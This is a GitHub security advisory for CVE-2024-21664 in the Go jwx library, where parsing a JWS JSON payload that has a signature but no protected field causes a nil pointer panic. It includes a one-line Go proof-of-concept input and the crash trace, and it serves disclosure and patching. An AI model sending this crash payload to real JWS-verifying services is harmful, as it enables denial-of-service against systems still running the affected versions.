# [M] Parsing JSON serialized payload without protected field can lead to segfault

## Summary
Severity: Medium
Advisory: GHSA-pvcr-v8j8-j5q3
CVE: CVE-2024-21664
CWE: CWE-476
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:L (CVSS_V3)
Published: 2024-01-09
Source: https://github.com/advisories/GHSA-pvcr-v8j8-j5q3
Type: github-advisory

## Affected
- Go: `github.com/lestrrat-go/jwx` — affected >=1.0.8 <1.2.28
- Go: `github.com/lestrrat-go/jwx/v2` — affected >=0 <2.0.19

## Details
### Summary

Calling `jws.Parse` with a JSON serialized payload where the `signature` field is present while `protected` is absent can lead to a nil pointer dereference.

### Details

This seems to also affect other functions that calls `Parse` internally, like `jws.Verify`.

My understanding of these functions from the docs is that they are supposed to fail gracefully on invalid input and don't require any prior validation.

Based on the stack trace in the PoC, the issue seems to be that the processing done in `jws/message.go:UnmarshalJSON()` assumes that if a `signature` field is present, then a `protected` field is also present. If this is not the case, then the subsequent call to `getB64Value(sig.protected)` will dereference `sig.protected`, which is `nil`.

### PoC

Reproducer:

```go
package poc

import (
        "testing"

        "github.com/lestrrat-go/jwx/v2/jws"
)

func TestPOC(t *testing.T) {
        _, _ = jws.Parse([]byte(`{"signature": ""}`))
}
```

Result:

```
$ go test        
--- FAIL: TestPOC (0.00s)
panic: runtime error: invalid memory address or nil pointer dereference [recovered]
        panic: runtime error: invalid memory address or nil pointer dereference
[signal SIGSEGV: segmentation violation code=0x1 addr=0x40 pc=0x5fd618]

goroutine 6 [running]:
testing.tRunner.func1.2({0x628800, 0x831030})
        /usr/local/go/src/testing/testing.go:1545 +0x238
testing.tRunner.func1()
        /usr/local/go/src/testing/testing.go:1548 +0x397
panic({0x628800?, 0x831030?})
        /usr/local/go/src/runtime/panic.go:914 +0x21f
github.com/lestrrat-go/jwx/v2/jws.getB64Value({0x0?, 0x0?})
        /home/fredrik/go/pkg/mod/github.com/lestrrat-go/jwx/v2@v2.0.18/jws/jws.go:484 +0x18
github.com/lestrrat-go/jwx/v2/jws.(*Message).UnmarshalJSON(0xc0000a2140, {0xc0000ec000, 0x11, 0x200})
        /home/fredrik/go/pkg/mod/github.com/lestrrat-go/jwx/v2@v2.0.18/jws/message.go:323 +0x4ad
encoding/json.(*decodeState).object(0xc0000ea028, {0x64fa60?, 0xc0000a2140?, 0x16?})
        /usr/local/go/src/encoding/json/decode.go:604 +0x6cc
encoding/json.(*decodeState).value(0xc0000ea028, {0x64fa60?, 0xc0000a2140?, 0xc00006e630?})
        /usr/local/go/src/encoding/json/decode.go:374 +0x3e
encoding/json.(*decodeState).unmarshal(0xc0000ea028, {0x64fa60?, 0xc0000a2140?})
        /usr/local/go/src/encoding/json/decode.go:181 +0x133
encoding/json.(*Decoder).Decode(0xc0000ea000, {0x64fa60, 0xc0000a2140})
        /usr/local/go/src/encoding/json/stream.go:73 +0x179
github.com/lestrrat-go/jwx/v2/internal/json.Unmarshal({0xc00001a288, 0x11, 0x11}, {0x64fa60, 0xc0000a2140})
        /home/fredrik/go/pkg/mod/github.com/lestrrat-go/jwx/v2@v2.0.18/internal/json/json.go:26 +0x97
github.com/lestrrat-go/jwx/v2/jws.parseJSON({0xc00001a288, 0x11, 0x11})
        /home/fredrik/go/pkg/mod/github.com/lestrrat-go/jwx/v2@v2.0.18/jws/jws.go:588 +0x50
github.com/lestrrat-go/jwx/v2/jws.Parse({0xc00001a288, 0x11, 0x11}, {0x0?, 0xc00006e760?, 0x48450f?})
        /home/fredrik/go/pkg/mod/github.com/lestrrat-go/jwx/v2@v2.0.18/jws/jws.go:525 +0x89
poc.TestPOC(0x0?)
        /home/fredrik/src/jwx_poc/poc_test.go:10 +0x57
testing.tRunner(0xc0000e4340, 0x68ef30)
        /usr/local/go/src/testing/testing.go:1595 +0xff
created by testing.(*T).Run in goroutine 1
        /usr/local/go/src/testing/testing.go:1648 +0x3ad
exit status 2
FAIL    poc     0.005s
```

### Impact

The vulnerability can be used to crash / DOS a system doing JWS verification.

## References
- https://github.com/lestrrat-go/jwx/security/advisories/GHSA-pvcr-v8j8-j5q3
- https://nvd.nist.gov/vuln/detail/CVE-2024-21664
- https://github.com/lestrrat-go/jwx/commit/0e8802ce6842625845d651456493e7c87625601f
- https://github.com/lestrrat-go/jwx/commit/8c53d0ae52d5ab1e2b37c5abb67def9e7958fd65
- https://github.com/lestrrat-go/jwx/commit/d69a721931a5c48b9850a42404f18e143704adcd
- https://github.com/lestrrat-go/jwx
